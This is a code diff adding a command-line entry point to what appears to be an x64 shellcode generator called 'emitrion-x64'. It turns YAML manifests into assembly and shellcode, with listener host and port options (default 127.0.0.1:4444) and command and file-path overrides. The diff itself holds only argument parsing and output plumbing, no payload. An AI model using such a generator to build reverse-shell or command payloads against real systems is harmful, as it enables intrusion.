@@ -13,7 +13,9 @@ Entry state assumptions:
 """
 from __future__ import annotations
 
+import argparse
 import os
+import sys
 from datetime import UTC, datetime
 
 from .api_database import API_DATABASE, MODULE_LOAD_ORDER, STRUCT_DATABASE, STRUCT_DATABASE_X64
@@ -985,3 +987,97 @@ def build_x64(
         assembler=assembler,
         asm_errors=asm_errors if asm_errors else None,
     )
+
+
+# ---------------------------------------------------------------------------
+# CLI
+# ---------------------------------------------------------------------------
+
+
+def main_x64() -> None:
+    """CLI entry point for x64 builds.
+
+    Usage:
+        uv run emitrion-x64 manifest.yaml --lhost 192.168.1.100 --lport 9001
+        uv run emitrion-x64 manifest.yaml --no-assemble --out emitter_out/
+    """
+    from .build import _resolve_lhost, write_outputs
+    from .schema import CANONICAL_TEMPLATES, LEGACY_TEMPLATES
+
+    valid_x64_templates = sorted(
+        t for t in CANONICAL_TEMPLATES | LEGACY_TEMPLATES
+    )
+
+    parser = argparse.ArgumentParser(
+        description="emitrion-x64: manifest -> x64 assembly + contract",
+    )
+    parser.add_argument("manifest", help="Path to manifest YAML file")
+    parser.add_argument(
+        "--template", choices=valid_x64_templates, default=None,
+        help="Override manifest template",
+    )
+    parser.add_argument("--out", default="emitter_out", help="Output directory")
+    parser.add_argument(
+        "--lhost", default=None, metavar="IP|IFACE",
+        help="Listener/server IP or interface name",
+    )
+    parser.add_argument(
+        "--lport", type=int, default=None,
+        help="Listener/server port",
+    )
+    parser.add_argument("--command", default=None, help="Command string override")
+    parser.add_argument("--src", default=None, help="Source path override")
+    parser.add_argument("--dst", default=None, help="Destination path override")
+    parser.add_argument("--no-assemble", action="store_true",
+                        help="Skip assembly (generate .asm only)")
+
+    args = parser.parse_args()
+
+    lhost = _resolve_lhost(args.lhost) if args.lhost else "127.0.0.1"
+    lport = args.lport or 4444
+
+    config = TemplateConfig(
+        lhost=lhost,
+        lport=lport,
+        command=args.command,
+        src_path=args.src,
+        dst_path=args.dst,
+        arch="x64",
+    )
+
+    result = build_x64(
+        args.manifest,
+        template_name=args.template,
+        config=config,
+        out_dir=args.out,
+        assemble=not args.no_assemble,
+    )
+    write_outputs(result, args.out)
+
+    print(f"[+] Arch:      x64")
+    print(f"[+] Generated: {args.out}/asm/generated.asm")
+    print(f"[+] Debug:     {args.out}/asm/debug_runner.py")
+    print(f"[+] Contract:  {args.out}/Documentation/contract.md")
+    if result.shellcode_bytes:
+        print(f"[+] Assembler: {result.assembler}")
+        print(f"[+] Shellcode: {len(result.shellcode_bytes)} bytes")
+        print(f"[+] Hex:       {args.out}/bin/shellcode.{{bin,hex,py,c}}")
+        if result.asm_errors:
+            for err in result.asm_errors:
+                print(f"[!] {err}", file=sys.stderr)
+            sys.exit(1)
+    else:
+        if result.asm_errors:
+            print("[!] Assembly failed:")
+            for err in result.asm_errors:
+                print(f"    {err}")
+            sys.exit(1)
+        elif not args.no_assemble:
+            print("[!] Assembly requested but no assembler available")
+            sys.exit(1)
+        else:
+            print("[*] Assembly skipped (--no-assemble)")
+
+
+if __name__ == "__main__":
+    main_x64()
